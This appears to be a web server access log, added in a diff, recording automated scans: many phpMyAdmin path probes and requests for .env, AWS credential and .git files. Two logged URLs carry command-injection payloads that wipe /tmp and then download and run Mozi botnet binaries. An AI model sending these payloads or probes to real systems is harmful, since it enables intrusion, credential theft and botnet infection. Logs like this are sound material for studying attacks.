+INFO:     135.125.217.54:49134 - "POST / HTTP/1.1" 405 Method Not Allowed
+INFO:     205.210.31.10:64740 - "GET / HTTP/1.1" 307 Temporary Redirect
+INFO:     106.75.62.209:48796 - "GET / HTTP/1.1" 307 Temporary Redirect
+INFO:     209.141.35.17:44138 - "GET / HTTP/1.1" 307 Temporary Redirect
+INFO:     167.71.229.198:43390 - "GET /aaa9 HTTP/1.1" 404 Not Found
+INFO:     167.71.229.198:43402 - "GET /aab8 HTTP/1.1" 404 Not Found
+INFO:     162.243.160.161:49198 - "GET /sql/phpmanager/index.php?lang=en HTTP/1.1" 404 Not Found
+INFO:     162.243.160.161:49198 - "GET /phpMyAdmin2/index.php?lang=en HTTP/1.1" 404 Not Found
+INFO:     162.243.160.161:49198 - "GET /sql/sqladmin/index.php?lang=en HTTP/1.1" 404 Not Found
+INFO:     162.243.160.161:49198 - "GET /phpmyadmin5/index.php?lang=en HTTP/1.1" 404 Not Found
+INFO:     162.243.160.161:49198 - "GET /administrator/phpMyAdmin/index.php?lang=en HTTP/1.1" 404 Not Found
+INFO:     162.243.160.161:49198 - "GET /phpmyadmin3/index.php?lang=en HTTP/1.1" 404 Not Found
+INFO:     162.243.160.161:49198 - "GET /phpMyAdmin-4/index.php?lang=en HTTP/1.1" 404 Not Found
+INFO:     162.243.160.161:49198 - "GET /program/index.php?lang=en HTTP/1.1" 404 Not Found
+INFO:     162.243.160.161:49198 - "GET /phpMyAdmin-5.1.1/index.php?lang=en HTTP/1.1" 404 Not Found
+INFO:     162.243.160.161:49198 - "GET /shopdb/index.php?lang=en HTTP/1.1" 404 Not Found
+INFO:     162.243.160.161:49198 - "GET /phpMyAdmin-5.3.0-all-languages/index.php?lang=en HTTP/1.1" 404 Not Found
+INFO:     162.243.160.161:49198 - "GET /phpmyadmin2013/index.php?lang=en HTTP/1.1" 404 Not Found
+INFO:     162.243.160.161:49198 - "GET /administrator/PMA/index.php?lang=en HTTP/1.1" 404 Not Found
+INFO:     162.243.160.161:49198 - "GET /db/phpmyadmin5/index.php?lang=en HTTP/1.1" 404 Not Found
+INFO:     162.243.160.161:49198 - "GET /phpMyAdmin5.2/index.php?lang=en HTTP/1.1" 404 Not Found
+INFO:     162.243.160.161:49198 - "GET /phpMyAdmin-5.1.3/index.php?lang=en HTTP/1.1" 404 Not Found
+INFO:     162.243.160.161:49198 - "GET /phpMyAdmin-5.2.0/index.php?lang=en HTTP/1.1" 404 Not Found
+INFO:     162.243.160.161:49198 - "GET /db/websql/index.php?lang=en HTTP/1.1" 404 Not Found
+INFO:     162.243.160.161:49198 - "GET /admin/phpMyAdmin/index.php?lang=en HTTP/1.1" 404 Not Found
+INFO:     162.243.160.161:49198 - "GET /administrator/pma/index.php?lang=en HTTP/1.1" 404 Not Found
+INFO:     162.243.160.161:49198 - "GET /phpMyAdmin5.2/index.php?lang=en HTTP/1.1" 404 Not Found
+INFO:     162.243.160.161:49198 - "GET /_phpMyAdmin/index.php?lang=en HTTP/1.1" 404 Not Found
+INFO:     162.243.160.161:49198 - "GET /phpmyadmin3/index.php?lang=en HTTP/1.1" 404 Not Found
+INFO:     162.243.160.161:49198 - "GET /administrator/admin/index.php?lang=en HTTP/1.1" 404 Not Found
+INFO:     162.243.160.161:49198 - "GET /sql/phpMyAdmin2/index.php?lang=en HTTP/1.1" 404 Not Found
+INFO:     162.243.160.161:49198 - "GET /phpMyAdmin4/index.php?lang=en HTTP/1.1" 404 Not Found
+INFO:     162.243.160.161:49198 - "GET /mysql/pma/index.php?lang=en HTTP/1.1" 404 Not Found
+INFO:     162.243.160.161:49198 - "GET /db/myadmin/index.php?lang=en HTTP/1.1" 404 Not Found
+INFO:     162.243.160.161:49198 - "GET /mysql/web/index.php?lang=en HTTP/1.1" 404 Not Found
+INFO:     162.243.160.161:49198 - "GET /phppma/index.php?lang=en HTTP/1.1" 404 Not Found
+INFO:     162.243.160.161:49198 - "GET /php-myadmin/index.php?lang=en HTTP/1.1" 404 Not Found
+INFO:     162.243.160.161:49198 - "GET /phpMyadmin/index.php?lang=en HTTP/1.1" 404 Not Found
+INFO:     162.243.160.161:49198 - "GET /phpMyAdmin-5.1.0/index.php?lang=en HTTP/1.1" 404 Not Found
+INFO:     162.243.160.161:49198 - "GET /_phpmyadmin/index.php?lang=en HTTP/1.1" 404 Not Found
+INFO:     162.243.160.161:49198 - "GET /db/myadmin/index.php?lang=en HTTP/1.1" 404 Not Found
+INFO:     162.243.160.161:49198 - "GET /db/myadmin/index.php?lang=en HTTP/1.1" 404 Not Found
+INFO:     162.243.160.161:49198 - "GET /phpmyadmin2021/index.php?lang=en HTTP/1.1" 404 Not Found
+INFO:     162.243.160.161:49198 - "GET /db/dbadmin/index.php?lang=en HTTP/1.1" 404 Not Found
+INFO:     162.243.160.161:49198 - "GET /_phpmyadmin/index.php?lang=en HTTP/1.1" 404 Not Found
+INFO:     162.243.160.161:49198 - "GET /phpMyAdmin-5.1.1/index.php?lang=en HTTP/1.1" 404 Not Found
+INFO:     162.243.160.161:49198 - "GET /phpMyAdmin-latest-all-languages/index.php?lang=en HTTP/1.1" 404 Not Found
+INFO:     162.243.160.161:49198 - "GET /database/index.php?lang=en HTTP/1.1" 404 Not Found
+INFO:     162.243.160.161:49198 - "GET /phpMyAdmin-4/index.php?lang=en HTTP/1.1" 404 Not Found
+INFO:     162.243.160.161:49198 - "GET /phpmy/index.php?lang=en HTTP/1.1" 404 Not Found
+INFO:     162.243.160.161:49198 - "GET /mysqladmin/index.php?lang=en HTTP/1.1" 404 Not Found
+INFO:     162.243.160.161:49198 - "GET /sql/phpmyadmin3/index.php?lang=en HTTP/1.1" 404 Not Found
+INFO:     162.243.160.161:49198 - "GET /db/phpmyadmin/index.php?lang=en HTTP/1.1" 404 Not Found
+INFO:     162.243.160.161:49198 - "GET /phpmyadmin4/index.php?lang=en HTTP/1.1" 404 Not Found
+INFO:     162.243.160.161:49198 - "GET /phpMyAdmin-5.3.0/index.php?lang=en HTTP/1.1" 404 Not Found
+INFO:     162.243.160.161:49198 - "GET /mysql/pma/index.php?lang=en HTTP/1.1" 404 Not Found
+INFO:     162.243.160.161:49198 - "GET /mysql/web/index.php?lang=en HTTP/1.1" 404 Not Found
+INFO:     162.243.160.161:49198 - "GET /phpMyAdmin-5.2.0-all-languages/index.php?lang=en HTTP/1.1" 404 Not Found
+INFO:     162.243.160.161:49198 - "GET /db/websql/index.php?lang=en HTTP/1.1" 404 Not Found
+INFO:     162.243.160.161:49198 - "GET /phpmyadmin2013/index.php?lang=en HTTP/1.1" 404 Not Found
+INFO:     162.243.160.161:49198 - "GET /php-my-admin/index.php?lang=en HTTP/1.1" 404 Not Found
+INFO:     162.243.160.161:49198 - "GET /1phpmyadmin/index.php?lang=en HTTP/1.1" 404 Not Found
+INFO:     162.243.160.161:49198 - "GET /db/index.php?lang=en HTTP/1.1" 404 Not Found
+INFO:     162.243.160.161:49198 - "GET /phpMyAdmin-latest-all-languages/index.php?lang=en HTTP/1.1" 404 Not Found
+INFO:     162.243.160.161:49198 - "GET /PMA/index.php?lang=en HTTP/1.1" 404 Not Found
+INFO:     162.243.160.161:49198 - "GET /mysqlmanager/index.php?lang=en HTTP/1.1" 404 Not Found
+INFO:     162.243.160.161:49198 - "GET /mysql/admin/index.php?lang=en HTTP/1.1" 404 Not Found
+INFO:     162.243.160.161:49198 - "GET /admin/web/index.php?lang=en HTTP/1.1" 404 Not Found
+INFO:     162.243.160.161:49198 - "GET /administrator/pma/index.php?lang=en HTTP/1.1" 404 Not Found
+INFO:     162.243.160.161:49198 - "GET /administrator/web/index.php?lang=en HTTP/1.1" 404 Not Found
+INFO:     162.243.160.161:49198 - "GET /phpMyAdmin3/index.php?lang=en HTTP/1.1" 404 Not Found
+INFO:     162.243.160.161:49198 - "GET /db/phpmyadmin/index.php?lang=en HTTP/1.1" 404 Not Found
+INFO:     162.243.160.161:49198 - "GET /administrator/db/index.php?lang=en HTTP/1.1" 404 Not Found
+INFO:     162.243.160.161:49198 - "GET /db/index.php?lang=en HTTP/1.1" 404 Not Found
+INFO:     162.243.160.161:49198 - "GET /db/phpmyadmin5/index.php?lang=en HTTP/1.1" 404 Not Found
+INFO:     162.243.160.161:49198 - "GET /phpMyAdmin4/index.php?lang=en HTTP/1.1" 404 Not Found
+INFO:     162.243.160.161:49198 - "GET /shopdb/index.php?lang=en HTTP/1.1" 404 Not Found
+INFO:     162.243.160.161:49198 - "GET /mysql/web/index.php?lang=en HTTP/1.1" 404 Not Found
+INFO:     162.243.160.161:49198 - "GET /db/phpmyadmin3/index.php?lang=en HTTP/1.1" 404 Not Found
+INFO:     162.243.160.161:49198 - "GET /phpmyadmin2014/index.php?lang=en HTTP/1.1" 404 Not Found
+INFO:     162.243.160.161:49198 - "GET /sqlmanager/index.php?lang=en HTTP/1.1" 404 Not Found
+INFO:     162.243.160.161:49198 - "GET /db/phpMyAdmin3/index.php?lang=en HTTP/1.1" 404 Not Found
+INFO:     162.243.160.161:49198 - "GET /wp-content/plugins/portable-phpmyadmin/wp-pma-mod/index.php?lang=en HTTP/1.1" 404 Not Found
+INFO:     162.243.160.161:49198 - "GET /mysql/pma/index.php?lang=en HTTP/1.1" 404 Not Found
+INFO:     162.243.160.161:49198 - "GET /db/phpmyadmin/index.php?lang=en HTTP/1.1" 404 Not Found
+INFO:     162.243.160.161:49198 - "GET /administrator/phpMyAdmin/index.php?lang=en HTTP/1.1" 404 Not Found
+INFO:     162.243.160.161:49198 - "GET /MyAdmin/index.php?lang=en HTTP/1.1" 404 Not Found
+INFO:     162.243.160.161:49198 - "GET /admin/sysadmin/index.php?lang=en HTTP/1.1" 404 Not Found
+INFO:     162.243.160.161:49198 - "GET /shopdb/index.php?lang=en HTTP/1.1" 404 Not Found
+INFO:     162.243.160.161:49198 - "GET /database/index.php?lang=en HTTP/1.1" 404 Not Found
+INFO:     162.243.160.161:49198 - "GET /phpMyAdmin_/index.php?lang=en HTTP/1.1" 404 Not Found
+INFO:     162.243.160.161:49198 - "GET /phpmyadmin2021/index.php?lang=en HTTP/1.1" 404 Not Found
+INFO:     162.243.160.161:49198 - "GET /phpMyAdmin5/index.php?lang=en HTTP/1.1" 404 Not Found
+INFO:     162.243.160.161:49198 - "GET /phpmy/index.php?lang=en HTTP/1.1" 404 Not Found
+INFO:     162.243.160.161:49198 - "GET /db/phpMyAdmin3/index.php?lang=en HTTP/1.1" 404 Not Found
+INFO:     162.243.160.161:49198 - "GET /phpmyadmin2019/index.php?lang=en HTTP/1.1" 404 Not Found
+INFO:     162.243.160.161:49198 - "GET /db/dbadmin/index.php?lang=en HTTP/1.1" 404 Not Found
+INFO:     162.243.160.161:49198 - "GET /phpMyAdmin-5.1.1/index.php?lang=en HTTP/1.1" 404 Not Found
+INFO:     162.243.160.161:49198 - "GET /phpMyAdmin-5.2.0-all-languages/index.php?lang=en HTTP/1.1" 404 Not Found
+INFO:     162.243.160.161:49198 - "GET /phpMyAdmin-5.1.0/index.php?lang=en HTTP/1.1" 404 Not Found
+INFO:     162.243.160.161:49198 - "GET /administrator/pma/index.php?lang=en HTTP/1.1" 404 Not Found
+INFO:     162.243.160.161:49198 - "GET /sql/websql/index.php?lang=en HTTP/1.1" 404 Not Found
+INFO:     162.243.160.161:49198 - "GET /admin/web/index.php?lang=en HTTP/1.1" 404 Not Found
+INFO:     162.243.160.161:49198 - "GET /wp-content/plugins/portable-phpmyadmin/wp-pma-mod/index.php?lang=en HTTP/1.1" 404 Not Found
+INFO:     162.243.160.161:49198 - "GET /administrator/db/index.php?lang=en HTTP/1.1" 404 Not Found
+INFO:     162.243.160.161:49198 - "GET /db/phpMyAdmin3/index.php?lang=en HTTP/1.1" 404 Not Found
+INFO:     162.243.160.161:49198 - "GET /phpmyAdmin/index.php?lang=en HTTP/1.1" 404 Not Found
+INFO:     162.243.160.161:49198 - "GET /phpMyAdmin4/index.php?lang=en HTTP/1.1" 404 Not Found
+INFO:     162.243.160.161:49198 - "GET /db/phpMyAdmin3/index.php?lang=en HTTP/1.1" 404 Not Found
+INFO:     162.243.160.161:49198 - "GET /phpMyAdmin/index.php?lang=en HTTP/1.1" 404 Not Found
+INFO:     162.243.160.161:49198 - "GET /sql/phpMyAdmin/index.php?lang=en HTTP/1.1" 404 Not Found
+INFO:     162.243.160.161:49198 - "GET /sql/webdb/index.php?lang=en HTTP/1.1" 404 Not Found
+INFO:     162.243.160.161:49198 - "GET /phpMyAdmin-3/index.php?lang=en HTTP/1.1" 404 Not Found
+INFO:     162.243.160.161:49198 - "GET /2phpmyadmin/index.php?lang=en HTTP/1.1" 404 Not Found
+INFO:     162.243.160.161:49198 - "GET /MyAdmin/index.php?lang=en HTTP/1.1" 404 Not Found
+INFO:     162.243.160.161:49198 - "GET /administrator/phpMyAdmin/index.php?lang=en HTTP/1.1" 404 Not Found
+INFO:     162.243.160.161:49198 - "GET /admin/db/index.php?lang=en HTTP/1.1" 404 Not Found
+INFO:     162.243.160.161:49198 - "GET /administrator/PMA/index.php?lang=en HTTP/1.1" 404 Not Found
+INFO:     162.243.160.161:49198 - "GET /phpMyAdmin2/index.php?lang=en HTTP/1.1" 404 Not Found
+INFO:     162.243.160.161:49198 - "GET /mysql/mysqlmanager/index.php?lang=en HTTP/1.1" 404 Not Found
+INFO:     162.243.160.161:49198 - "GET /sql/webadmin/index.php?lang=en HTTP/1.1" 404 Not Found
+INFO:     162.243.160.161:49198 - "GET /phpMyAdmin5.2/index.php?lang=en HTTP/1.1" 404 Not Found
+INFO:     162.243.160.161:49198 - "GET /_phpmyadmin_/index.php?lang=en HTTP/1.1" 404 Not Found
+INFO:     162.243.160.161:49198 - "GET /phpmyadmin5/index.php?lang=en HTTP/1.1" 404 Not Found
+INFO:     162.243.160.161:49198 - "GET /mysql/sqlmanager/index.php?lang=en HTTP/1.1" 404 Not Found
+INFO:     162.243.160.161:49198 - "GET /db/phpmyadmin/index.php?lang=en HTTP/1.1" 404 Not Found
+INFO:     162.243.160.161:49198 - "GET /mysqladmin/index.php?lang=en HTTP/1.1" 404 Not Found
+INFO:     162.243.160.161:49198 - "GET /myadmin/index.php?lang=en HTTP/1.1" 404 Not Found
+INFO:     162.243.160.161:49198 - "GET /sql/phpMyAdmin/index.php?lang=en HTTP/1.1" 404 Not Found
+INFO:     162.243.160.161:49198 - "GET /db/phpMyAdmin/index.php?lang=en HTTP/1.1" 404 Not Found
+INFO:     162.243.160.161:49198 - "GET /db/dbweb/index.php?lang=en HTTP/1.1" 404 Not Found
+INFO:     162.243.160.161:49198 - "GET /2phpmyadmin/index.php?lang=en HTTP/1.1" 404 Not Found
+INFO:     162.243.160.161:49198 - "GET /phpMyAdmin-5.1.2/index.php?lang=en HTTP/1.1" 404 Not Found
+INFO:     66.249.92.2:58362 - "GET /privacy HTTP/1.1" 200 OK
+INFO:     128.14.134.134:49362 - "GET / HTTP/1.1" 307 Temporary Redirect
+WARNING:  Invalid HTTP request received.
+WARNING:  Invalid HTTP request received.
+WARNING:  Invalid HTTP request received.
+INFO:     34.228.30.167:49558 - "GET /_profiler/phpinfo HTTP/1.1" 404 Not Found
+INFO:     34.228.30.167:49712 - "GET /phpinfo.php HTTP/1.1" 404 Not Found
+INFO:     34.228.30.167:49807 - "GET /phpinfo HTTP/1.1" 404 Not Found
+INFO:     34.228.30.167:49894 - "GET /aws.yml HTTP/1.1" 404 Not Found
+INFO:     34.228.30.167:50009 - "GET /.env.bak HTTP/1.1" 404 Not Found
+INFO:     34.228.30.167:50139 - "GET /info.php HTTP/1.1" 404 Not Found
+INFO:     34.228.30.167:50324 - "GET /.aws/credentials HTTP/1.1" 404 Not Found
+INFO:     34.228.30.167:50470 - "GET / HTTP/1.1" 307 Temporary Redirect
+INFO:     34.228.30.167:50810 - "GET /config/aws.yml HTTP/1.1" 404 Not Found
+INFO:     34.228.30.167:50981 - "GET / HTTP/1.1" 307 Temporary Redirect
+INFO:     34.228.30.167:51184 - "GET /config.js HTTP/1.1" 404 Not Found
+INFO:     143.244.50.172:36722 - "GET /config/getuser?index=0 HTTP/1.1" 404 Not Found
+INFO:     88.198.63.88:53669 - "GET /.git/config HTTP/1.1" 404 Not Found
+INFO:     135.125.217.54:57368 - "GET /.env HTTP/1.1" 404 Not Found
+INFO:     135.125.217.54:58092 - "POST / HTTP/1.1" 405 Method Not Allowed
+INFO:     95.214.235.205:41326 - "GET /.env HTTP/1.1" 404 Not Found
+INFO:     95.214.235.205:44348 - "POST / HTTP/1.1" 405 Method Not Allowed
+INFO:     135.125.217.54:47376 - "GET /.env HTTP/1.1" 404 Not Found
+INFO:     135.125.217.54:48106 - "POST / HTTP/1.1" 405 Method Not Allowed
+INFO:     20.106.33.55:60682 - "GET /.env HTTP/1.1" 404 Not Found
+INFO:     20.106.33.55:60849 - "POST / HTTP/1.1" 405 Method Not Allowed
+INFO:     185.107.56.93:52508 - "GET /.env HTTP/1.1" 404 Not Found
+INFO:     185.107.56.93:52528 - "POST / HTTP/1.1" 405 Method Not Allowed
+INFO:     23.251.102.74:60728 - "GET / HTTP/1.1" 307 Temporary Redirect
+INFO:     42.83.147.34:56668 - "GET / HTTP/1.1" 307 Temporary Redirect
+INFO:     92.118.39.82:42676 - "GET / HTTP/1.1" 307 Temporary Redirect
+INFO:     125.127.135.146:3668 - "GET /shell?cd+/tmp;rm+-rf+*;wget+http://192.168.1.1:8088/Mozi.a;chmod+777+Mozi.a;/tmp/Mozi.a+jaws HTTP/1.1" 404 Not Found
+INFO:     135.125.217.54:38418 - "GET /.env HTTP/1.1" 404 Not Found
+INFO:     135.125.217.54:39168 - "POST / HTTP/1.1" 405 Method Not Allowed
+INFO:     45.134.140.181:47462 - "GET /apis/apps/v1/namespaces/kube-system/daemonsets HTTP/1.1" 404 Not Found
+INFO:     104.152.52.89:46286 - "GET / HTTP/1.0" 307 Temporary Redirect
+WARNING:  Invalid HTTP request received.
+INFO:     106.75.145.200:61014 - "GET / HTTP/1.1" 307 Temporary Redirect
+INFO:     138.68.224.69:45170 - "GET /manager/html HTTP/1.1" 404 Not Found
+INFO:     185.180.143.79:58332 - "GET /cgi-bin/authLogin.cgi HTTP/1.1" 404 Not Found
+INFO:     185.254.196.115:50810 - "GET /.env HTTP/1.1" 404 Not Found
+INFO:     185.254.196.115:53792 - "POST / HTTP/1.1" 405 Method Not Allowed
+INFO:     135.125.217.54:51858 - "GET /.env HTTP/1.1" 404 Not Found
+INFO:     135.125.217.54:52562 - "POST / HTTP/1.1" 405 Method Not Allowed
+INFO:     193.32.162.159:52962 - "GET / HTTP/1.1" 307 Temporary Redirect
+INFO:     139.162.19.222:50952 - "GET / HTTP/1.1" 307 Temporary Redirect
+WARNING:  Invalid HTTP request received.
+WARNING:  Invalid HTTP request received.
+WARNING:  Invalid HTTP request received.
+INFO:     135.125.217.54:57998 - "GET /.env HTTP/1.1" 404 Not Found
+INFO:     135.125.217.54:58698 - "POST / HTTP/1.1" 405 Method Not Allowed
+WARNING:  Invalid HTTP request received.
+INFO:     152.32.221.195:38082 - "GET / HTTP/1.1" 307 Temporary Redirect
+INFO:     152.32.221.195:42848 - "GET /favicon.ico HTTP/1.1" 404 Not Found
+INFO:     152.32.221.195:44068 - "GET /robots.txt HTTP/1.1" 404 Not Found
+INFO:     152.32.221.195:45034 - "GET /sitemap.xml HTTP/1.1" 404 Not Found
+INFO:     185.254.196.115:41642 - "GET /.env HTTP/1.1" 404 Not Found
+INFO:     185.254.196.115:45158 - "POST / HTTP/1.1" 405 Method Not Allowed
+INFO:     113.142.131.55:56754 - "GET / HTTP/1.1" 307 Temporary Redirect
+WARNING:  Invalid HTTP request received.
+INFO:     80.85.241.15:42890 - "GET /lib/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 Not Found
+INFO:     87.236.176.37:54647 - "GET / HTTP/1.1" 307 Temporary Redirect
+INFO:     103.29.71.244:61000 - "GET / HTTP/1.0" 307 Temporary Redirect
+INFO:     135.125.217.54:40306 - "GET /.env HTTP/1.1" 404 Not Found
+INFO:     135.125.217.54:41122 - "POST / HTTP/1.1" 405 Method Not Allowed
+INFO:     143.198.201.142:47892 - "GET / HTTP/1.0" 307 Temporary Redirect
+INFO:     185.246.210.167:15407 - "GET / HTTP/1.1" 307 Temporary Redirect
+WARNING:  Invalid HTTP request received.
+WARNING:  Invalid HTTP request received.
+INFO:     77.91.78.56:57044 - "GET /laravel/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 Not Found
+INFO:     135.125.217.54:47522 - "GET /.env HTTP/1.1" 404 Not Found
+INFO:     135.125.217.54:48316 - "POST / HTTP/1.1" 405 Method Not Allowed
+INFO:     1.14.7.100:58210 - "HEAD /Core/Skin/Login.aspx HTTP/1.1" 404 Not Found
+WARNING:  Invalid HTTP request received.
+INFO:     34.64.82.69:50098 - "GET /robots.txt HTTP/1.1" 404 Not Found
+INFO:     34.64.82.71:33966 - "GET /app-ads.txt HTTP/1.1" 404 Not Found
+INFO:     35.91.4.115:43230 - "GET / HTTP/1.1" 307 Temporary Redirect
+INFO:     50.112.43.33:47502 - "GET /favicon.ico HTTP/1.1" 404 Not Found
+INFO:     50.112.43.33:58227 - "GET / HTTP/1.1" 307 Temporary Redirect
+INFO:     128.199.77.96:53476 - "GET / HTTP/1.0" 307 Temporary Redirect
+INFO:     117.213.15.207:53851 - "GET /setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://117.213.15.207:60511/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1 HTTP/1.0" 404 Not Found
+INFO:     205.210.31.131:52037 - "GET / HTTP/1.0" 307 Temporary Redirect
+INFO:     165.227.0.21:55230 - "GET / HTTP/1.0" 307 Temporary Redirect
+INFO:     47.251.33.74:57635 - "GET /.env HTTP/1.1" 404 Not Found
+INFO:     47.251.33.74:57826 - "POST / HTTP/1.1" 405 Method Not Allowed
+WARNING:  Invalid HTTP request received.
+INFO:     138.197.76.102:20000 - "GET / HTTP/1.0" 307 Temporary Redirect
+INFO:     135.125.217.54:51890 - "GET /.env HTTP/1.1" 404 Not Found
+INFO:     135.125.217.54:52602 - "POST / HTTP/1.1" 405 Method Not Allowed
+INFO:     Shutting down
+INFO:     Waiting for application shutdown.
+INFO:     Application shutdown complete.
+INFO:     Finished server process [203114]
